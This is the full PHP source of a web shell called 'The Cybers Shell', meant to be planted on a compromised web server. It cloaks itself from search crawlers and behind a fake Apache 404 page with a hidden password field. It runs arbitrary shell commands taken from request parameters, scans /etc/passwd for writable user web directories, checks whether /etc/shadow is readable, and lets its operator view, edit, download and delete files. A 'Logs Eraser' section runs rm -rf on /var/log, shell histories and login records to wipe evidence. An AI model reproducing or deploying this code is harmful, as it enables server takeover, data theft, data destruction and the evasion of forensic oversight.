<?
//
// CONFIG
//    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

$owner        = "JonatasFil";                                                       // Insert your nick
$version      = "0.6";                                                              // The version    
$auth_pass = "88999102282dc68709441867ebc4492e";                                    // md5 - thecybers
//    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
//

if(!empty($_SERVER['HTTP_USER_AGENT'])) { 
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler"); 
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) { 
        header('HTTP/1.0 404 Not Found'); 
        exit; 
    } 
} 

@session_start(); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0); 
@set_time_limit(0); 
@set_magic_quotes_runtime(0); 
@define('WSO_VERSION', '2.6'); 
  
if(get_magic_quotes_gpc()) { 
    function WSOstripslashes($array) { 
        return is_array($array) ? array_map('WSOstripslashes', $array) : stripslashes($array); 
    } 
    $_POST = WSOstripslashes($_POST); 
} 

function wsoLogin() { 
    die("<h1>Not Found</h1> 
<p>The requested URL was not found on this server.</p> 
<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p> 
<hr> 
<address>Apache/2.2.22 (Unix) mod_ssl/2.2.22 OpenSSL/1.0.0-fips mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 Server at Port 80</address> 
    <style> 
        input { margin:0;background-color:#fff;border:1px solid #fff; } 
    </style> 
    <pre align=center> 
    <form method=post> 
    <input type=password name=pass> 
    </form></pre>"); 
} 
  
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) 
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else
        wsoLogin(); 
  

?>


<!DOCTYPE html>
<html>
<head>
<link rel="icon" href="http://static1.squarespace.com/static/53c6ab6ae4b04d74ae28fc4b/t/53d95f45e4b042be0d26c9d0/1406754677505/TCG+Favicon.png" type="image/x-icon"/>
	<title>The Cybers Shell</title>
	<style>
		body{
			background-color:black;
			color:white;
		}
		th,td{
			background-color:#555;
			text-align: left;
			width:200px;
		}
	</style>
</head>
<body>
<center><p>
<pre><font color=white><font color=grey size=8>The Cybers Shell</font><font color=darkred size=4> BETA</font></pre><p></center>
<center>
<pre><font color="#cccccc" size="1"></font><font size="1"><font> ~ by Offset and JonatasFil</font></pre>
</center>
<b><u><center><?php echo "This server has been pwned by $owner"; ?></center></u></b>
</div><p>

<center>
<div id="menu" class="font-effect-fire-animation" color=darkred size=4; align="center">
<a href="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>">&nbsp;Home&nbsp;</a>
<a href="?action=srvrinformations">&nbsp;Server Infos&nbsp;</a>
<a href="?action=cmd">&nbsp;Command Execution&nbsp;</a>
<a href="?action=iplookdom">&nbsp;Ip Reverse&nbsp;</a>
<a href="?action=cari">&nbsp;Find Directory Writable/Readable&nbsp;</a>
<a href="?action=deltlogss">&nbsp;Logs&nbsp;</a>
<a href="?action=abot">&nbsp;About&nbsp;</a>

</div><br>

<?php
/*
	By: The Cybers Team
	Versão: Beta 0.5
	[ok] listar
	[ok] visualizar
	[ok] download
	[ok] editar
	[ok] deletar
	[ok] Server Info
	[ok] Command Execute
	[ok] Ip Lookup Domain
	[ok] Find Directory Writable/Readable
	[ok] Remove LOG
*/
	// Funções =======================================================




// FIND FILE WRITABLE

if(isset($_GET['action']) && $_GET['action'] == 'cari'){
echo '<center><b class="conte">
<a href="?action=cari">Find Directory Writable/Readable</a> -
</center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Find Directory Writable/Readable</span></center><br><br>'.$end; function read_dir($path) { global $count; if ($handle = opendir($path)) { while (false !== ($file = readdir($handle))) { $dr="$path$file/"; if (($file!='.') and ($file!='..') and is_dir($dr)) { if (is_readable($dr) and is_writeable($dr)) { echo "[RW] " . $dr . "<br>\n\r"; $count++; } read_dir($dr); }}}} $count=0; set_time_limit(0); @$passwd=fopen('/etc/passwd','r'); if (!$passwd) { echo "<br><center><font color='#ff0000' size='2pt' />[-] No Access to /etc/passwd\n\r</center>"; exit;} $path_to_public=array(); echo "<html><center><table style='margin: 0 auto;'><tr valign='top'><td align='left'><font color='#007700' size='2pt' />\n\r"; while(!feof($passwd)) { $str=fgets($passwd); $pos=strpos($str,":"); $username=substr($str,0,$pos); $dirz="/home/$username/public_html/"; if (($username!="")) { if (is_readable($dirz)) { array_push($path_to_public,$dirz); if (is_writeable($dirz)) { $count++; echo "<font color=white>[</font><font color=yellow>R</font><font color=green>W</font><font color=white>]</font> " . $dirz . "<br><br><br>\n\r";} else echo "<font color=white>[</font><font color=yellow>R</font><font color=white>]</font> " . $dirz . "<br>\n\r"; }}} echo "<br><br><font color=white size=2pt>[+]</font> <font color=#00dd00 size=2pt>Found </font><font color=yellow size=2pt>" . sizeof($path_to_public) . "</font> <font color=#00dd00 size=2pt>readable public_html directories.</font><br><br>\n\r\n\r"; if (sizeof($path_to_public) != '0') { foreach ($path_to_public as $path) { } echo "<font color=white size=2pt>[+]</font> <font color=#00dd00 size=2pt>Found</font><font color=yellow size=2pt> " . $count . " </font><font color=#00dd00 size=2pt>writable directories.</font>\n\r"; echo "</td></tr></table></center></html>";
}

}


// COMMAND EXECUTE

if(isset($_GET['action']) && $_GET['action'] == 'cmd'){
echo '<center><b class="conte">
<a href="?action=cmd">Command Execution</a> -
</center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Command Execution</span><center><br>';
echo '
<form method=get action="'.$me.'">
<p>
<textarea class="area" rows="17" name="S1" cols="70" >';
if (strlen($_GET['command'])>1 && $_GET['execmethod']!="popen"){
echo $_GET['execmethod']($_GET['command']);}
if (strlen($_POST['command'])>1 && $_POST['execmethod']!="popen"){
echo $_POST['execmethod']($_POST['command']);}

if (strlen($_GET['command'])>1 && $_GET['execmethod']=="popen"){
popen($_GET['command'],"r");}

echo'</textarea></p><br><p align="center">
<input type=hidden name="vw" size="50" value="cmd"> <input type="text" name="command" size="43"> <select name=execmethod>
  <option value="system">System</option>  <option value="exec">Exec</option>  <option value="passthru">Passthru</option><option value="popen">popen</option>
</select> <input type="submit" value="Execute">
</p></form>';

}




// ABOUT

if(isset($_GET['action']) && $_GET['action'] == 'abot'){
echo '
<br><center><img src="http://static.tumblr.com/c33a6eba385776f26555ba59f5fd54d2/cyncwgb/CENn1bfq6/tumblr_static_hacker_bot_new_tumblr_banner.jpg"></center><center>
<span style="font-size:30px; font-family:Fredericka the Great; color:#009900">The Cybers Shell - 2016</span><br><font color="#008800" size="1pt">Created by </font><font  color="#00bb00" size="1pt">Offset And JonatasFil</font> <font color="#006600" size="1pt">-</font> <font color="#00bb00" size="1pt">TheCybersTEAM</font><br><br><br>
<center><div class="logindiv"><table cellpadding="7" cellspacing="2">
<center><br><iframe src="https://www.facebook.com/plugins/like.php?href=https://www.facebook.com/TheCybersTeam&amp;send=false&amp;layout=standard&amp;width=400&amp;show_faces=false&amp;action=like&amp;colorscheme=light&amp;font=arial&amp;height=35" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:350px; height:20px;" allowTransparency="true"></iframe></center></table></div></center><br></center>
';
}


// SERVER INFORMATIONS

if(isset($_GET['action']) && $_GET['action'] == 'srvrinformations'){
echo '<center><b class="conte">
<a href="?action=srvrinformations">Server Informations</a>  </center>
</b>';
echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Server Security Informations</span><center><br>";
echo "<center><div class='tmpe'>
<table align='center' width='50%'><td><font color='#007700'>Kernel Version</font></td><td>";echo php_uname();
echo "<tr><td><font color='#007700'>Web Server</font></td><td>";echo $_SERVER["SERVER_SOFTWARE"];
echo "<tr><td><font color='#007700'>PHP Version</font></td><td>";echo phpversion(); echo " on "; echo php_sapi_name();
echo "<tr><td><font color='#007700'>Current User</font></td><td>";echo get_current_user();
echo "<tr><td><font color='#007700'>User ID</font></td><td>";echo getmyuid();
echo "<tr><td><font color='#007700'>Group</font></td><td>";echo getmygid();
echo "<tr><td><font color='#007700'>Cwd </font></td><td>";echo getcwd();
echo "<tr><td><font color='#007700'>Admin Server</font></td><td>";echo $_SERVER['SERVER_ADMIN'];
echo "<tr><td><font color='#007700'>Server Port</font></td><td>";echo $_SERVER['SERVER_PORT'];
echo "<tr><td><font color='#007700'>Server IP</font></td><td>";echo $serverIP = gethostbyname($_SERVER["HTTP_HOST"]);
echo "<tr><td><font color='#007700'>Client IP</font></td><td>";echo $_SERVER['REMOTE_ADDR'];
echo "<tr><td><font color='#007700'>cURL support</font></td><td>";echo function_exists('curl_version')?'Enabled':'No';
echo "<tr><td><font color='#007700'>Readable /etc/passwd</font></td><td>";echo @is_readable('/etc/passwd')?"Readable <a href='?action=moco'> [View]</a>":"Not Readable";
echo "<tr><td><font color='#007700'>Readable /etc/shadow</font></td><td>";echo @is_readable('/etc/shadow')?"Readable":"Not Readable";
$base = (ini_get("open_basedir") or strtoupper(ini_get("open_basedir"))=="ON")?"ON <font color='#007700'>secure</font>":"OFF <font color='#007700'>not secure</font>";
echo "<tr><td><font color='#007700'>Open Base Dir</font></td><td><font class=txt>" . $base . "</font>";
echo "</table></div></center><br>";
}


// IP LOOKUP DOMAIN

if(isset($_GET['action']) && $_GET['action'] == 'iplookdom'){

     echo "<center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Ip Lookup Reverse Domain</span></center>
";
echo "<center><img border='0' src='https://img.buzzfeed.com/buzzfeed-static/static/campaign_images/webdr01/2013/9/12/15/9-times-putin-pwned-obama-1-6849-1379013614-5_big.jpg' width=\"200\" height=\"200\" style='margin-top:10px'></center><div id=result>";
echo "<center><br><form><input type='text' size='60' value='yahoo.com' name='ghost' /><input type='hidden' name='action' value='iplookdom'> &nbsp;<input type='submit' value='&nbsp;&check;&nbsp;'></form></center>";
if(isset($_GET["ghost"]))
{
$site = $_GET["ghost"];
$ghost = "http://domains.yougetsignal.com/domains.php";

//Curl Function
$ch = curl_init($ghost);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$site&ket=");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POST, 1);
$resp = curl_exec($ch);
$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
$array = explode(",,", $resp);
unset($array[0]);
echo "<table style='margin: 0 auto'>";
foreach($array as $lnk)
{
    print "<tr><td><a  style=\"color:#0f0;font-weight:bold;\" href='$lnk' target=_blank>$lnk</a></td></tr>";
}
echo "</table>";
curl_close($ch);
}


}

// LOG REMOVE
if(isset($_GET['action']) && $_GET['action'] == 'deltlogss'){
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Logs Eraser</span><center><br>';
//remove log
echo "<table style='margin: 0 auto;'><tr valign='top'><td align='left'>";      
exec("rm -rf /tmp/logs");
exec("rm -rf /root/.ksh_history");
exec("rm -rf /root/.bash_history");
exec("rm -rf /root/.bash_logout");
exec("rm -rf /usr/local/apache/logs");
exec("rm -rf /usr/local/apache/log");
exec("rm -rf /var/apache/logs");
exec("rm -rf /var/apache/log");
exec("rm -rf /var/run/utmp");
exec("rm -rf /var/logs");
exec("rm -rf /var/log");
exec("rm -rf /var/adm");
exec("rm -rf /etc/wtmp");
exec("rm -rf /etc/utmp");
exec("rm -rf $HISTFILE");
exec("rm -rf /var/log/lastlog");
exec("rm -rf /var/log/wtmp");

//remove log
shell_exec("rm -rf /tmp/logs");
shell_exec("rm -rf /root/.ksh_history");
shell_exec("rm -rf /root/.bash_history");
shell_exec("rm -rf /root/.bash_logout");
shell_exec("rm -rf /usr/local/apache/logs");
shell_exec("rm -rf /usr/local/apache/log");
shell_exec("rm -rf /var/apache/logs");
shell_exec("rm -rf /var/apache/log");
shell_exec("rm -rf /var/run/utmp");
shell_exec("rm -rf /var/logs");
shell_exec("rm -rf /var/log");
shell_exec("rm -rf /var/adm");
shell_exec("rm -rf /etc/wtmp");
shell_exec("rm -rf /etc/utmp");
shell_exec("rm -rf $HISTFILE");
shell_exec("rm -rf /var/log/lastlog");
shell_exec("rm -rf /var/log/wtmp");

//temove log
passthru("rm -rf /tmp/logs");
passthru("rm -rf /root/.ksh_history");
passthru("rm -rf /root/.bash_history");
passthru("rm -rf /root/.bash_logout");
passthru("rm -rf /usr/local/apache/logs");
passthru("rm -rf /usr/local/apache/log");
passthru("rm -rf /var/apache/logs");
passthru("rm -rf /var/apache/log");
passthru("rm -rf /var/run/utmp");
passthru("rm -rf /var/logs");
passthru("rm -rf /var/log");
passthru("rm -rf /var/adm");
passthru("rm -rf /etc/wtmp");
passthru("rm -rf /etc/utmp");
passthru("rm -rf $HISTFILE");
passthru("rm -rf /var/log/lastlog");
passthru("rm -rf /var/log/wtmp");


//remove log
system("rm -rf /tmp/logs");
sleep(2);
echo'<br><font color="009900" face="Tahoma, Geneva, sans-serif" style="font-size: 10pt">Deleted [+].../tmp/logs <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif>';
sleep(2);

system("rm -rf /root/.bash_history");
sleep(2);
echo'<p>Deleted [+].../root/.bash_history <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /root/.ksh_history");
sleep(2);
echo'<p>Deleted [+].../root/.ksh_history <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /root/.bash_logout");
sleep(2);
echo'<p>Deleted [+].../root/.bash_logout <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /usr/local/apache/logs");
sleep(2);
echo'<p>Deleted [+].../usr/local/apache/logs <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /usr/local/apache/log");
sleep(2);
echo'<p>Deleted [+].../usr/local/apache/log <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /var/apache/logs");
sleep(2);
echo'<p>Deleted [+].../var/apache/logs <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /var/apache/log");
sleep(2);
echo'<p>Deleted [+].../var/apache/log <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /var/run/utmp");
sleep(2);
echo'<p>Deleted [+].../var/run/utmp <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /var/logs");
sleep(2);
echo'<p>Deleted [+].../var/logs <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /var/log");
sleep(2);
echo'<p>Deleted [+].../var/log <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /var/adm");
sleep(2);
echo'<p>Deleted [+].../var/adm <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /etc/wtmp");
sleep(2);
echo'<p>Deleted [+].../etc/wtmp <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /etc/utmp");
sleep(2);
echo'<p>Deleted [+].../etc/utmp <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf $HISTFILE");
sleep(2);
echo'<p>Deleted [+]...$HISTFILE <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>'; 

system("rm -rf /var/log/lastlog");
sleep(2);
echo'<p>Deleted [+].../var/log/lastlog <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

system("rm -rf /var/log/wtmp");
sleep(2);
echo'<p>Deleted [+].../var/log/wtmp <img src=http://rs717.pbsrc.com/albums/ww173/prestonjjrtr/Smileys/SmileyGreat.gif></p>';

sleep(4);

echo '</font><br><br><p><font color="00bb00" face="Tahoma, Geneva, sans-serif" style="font-size: 10pt">Log Apagado com sucesso !';
echo"</td></tr></table>";

}	

function listar($dir){
		echo "
			<table>
				<tr>
					<th>File</th>
					<th>Size</th>
					<th>View</th>
					<th>Download</th>
					<th>Edit</th>
					<th>Delete</th>
				</tr>
		";
		foreach(scandir($dir) as $file){
			if($file != "." && $file !=".."){
				echo "<tr>";
				echo "<td>".$file."</td>";
				echo "<td>".filesize($file)." bytes</td>";
				echo "<td><a href='$file'>Visualizar</a></td>";
				echo "<td><a href='?download=$file'>Download</a></td>";
				echo "<td><a href='?editar=$file'>Editar</a></td>";
				echo "<td><a href='?deletar=$file'>Deletar</a></td>";
				echo "</tr>";
			}
		}
		echo "</table>";
	}
	function download($arquivo){
	    header('Content-Type: application/octet-stream');
	    header('Content-Length: '.filesize($arquivo));
	    header('Content-Disposition: filename='.$arquivo);
	    readfile($arquivo);
	    exit();
	}
	function editar($editar){
		echo "<form action=shell.php method=post>";
		$arq = file($editar);
		echo "<input name=arquivo type=hidden value='$editar'>";
		echo "<textarea name=salvar cols=100 rows=10>";
		foreach($arq as $linha){
			echo htmlspecialchars($linha);
		}
		echo "</textarea>";
		echo "<br />";
		echo "<input type=submit value=salvar>";
		echo "</form>";
		exit();
	}
	function salvar($dados, $arquivo){
		$fp = fopen($arquivo, "w");
		fwrite($fp,$dados);
		fclose($fp);
	}
	function deletar($arquivo){
		unlink($arquivo);
	}
	// POST e GET ==================================================
	if($salvar = $_POST['salvar'] and $arquivo = $_POST['arquivo']){
		salvar($salvar,$arquivo);
	}
	if($arquivo = $_GET['download']){
		download($arquivo);
	}
	if($editar = $_GET['editar']){
		editar($editar);
	}
	if($deletar = $_GET['deletar']){
		deletar($deletar);
	}
	// Shell =======================================================
	$diretorio = getcwd();
	listar($diretorio);
?>
<br>
<br>
<br<
</center></span><footer id="ftr" style="left:0px; right:0px; bottom:0px; background:transparent); text-align:center;"><font color="#cccccc" size="1">&copy; TheCybers Shell 2016  | Coded by Offset And JonatasFil</font></footer>
</body>
</html>
